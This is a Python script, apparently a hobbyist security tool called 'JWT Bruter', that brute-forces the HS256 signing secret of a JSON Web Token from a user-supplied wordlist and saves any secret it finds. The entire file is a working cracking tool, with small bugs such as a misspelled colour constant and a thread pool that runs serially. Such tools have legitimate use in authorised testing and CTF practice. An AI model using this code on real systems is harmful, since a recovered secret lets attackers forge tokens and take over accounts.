#!/bin/env python3
import jwt
import time
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
import psutil
import sys

def brute_force_jwt(encoded, password):
    try:
        payload = jwt.decode(encoded, password, algorithms=['HS256'])
        return password
    except jwt.InvalidKeyError:
        pass
    except jwt.ExpiredSignatureError:
        pass
    except Exception as e:
        pass
    return None

def get_num_threads():
    cpu_usage = psutil.cpu_percent()
    if cpu_usage < 60:
        return 8
    elif cpu_usage < 80:
        return 4
    else:
        return 2

def load_passwords(password_list):
    try:
        with open(password_list, 'rb') as file:
            return [line.strip().decode('latin-1') for line in file]
    except FileNotFoundError:
        print(Fore.RED + "[-] Password list file not found, Exiting.")
        sys.exit(1)
    except Exception as e:
        print(Fore.Red + f"[-] An error occurred while loading passwords: {str(e)}" )
        sys.exit(1)
def save_found_password(success, output_file):
    with open(output_file, 'a') as file:
        file.write(success + '\n')

def main():
    banner = """
    ╔╦╗╔═╗╔╦╗ ╦╦ ╦╔╦╗
     ║║║╣  ║║ ║║║║ ║
    ═╩╝╚═╝═╩╝╚╝╚╩╝ ╩ v1.2
    JWT Bruter by Asbawy
    """
    print(Fore.RED + banner)
    encoded = input(Fore.BLUE + "Enter JWT token: ")

    try:
        jwt.decode(encoded, options={'verify_signature': False})
    except jwt.InvalidTokenError:
        print(Fore.RED + "[-] Invalid JWT token, Exiting.")
        sys.exit(1)

    password_list = input(Fore.BLUE + "Enter the passwords list: ")
    output_file = input(Fore.BLUE + "Enter the output file for found passwords (optional): ")

    passwords = load_passwords(password_list)
    print(Fore.CYAN+f"[INFO] Starting brute force with {len(passwords)} passwords....")
    start_time = time.time()
    success = None

    with ThreadPoolExecutor(max_workers=get_num_threads()) as executor:
        passwords_tested = 0
        for secret in passwords:
            result = executor.submit(brute_force_jwt, encoded, secret)
            passwords_tested += 1
            if result.result():
                success = result.result()
                if output_file:
                    save_found_password(success, output_file)
                break
            sys.stdout.write(Fore.CYAN+f"\r[INFO] Passwords tested: {passwords_tested}")
            sys.stdout.flush()

    if success:
        print(Fore.GREEN+f"\n[+] Token decoded with the following password: [{success}]")
    else:
        print(Fore.RED+"\n[-] Failed to decode token.")

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(Fore.CYAN+f"[INFO] Elapsed time: {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    main()
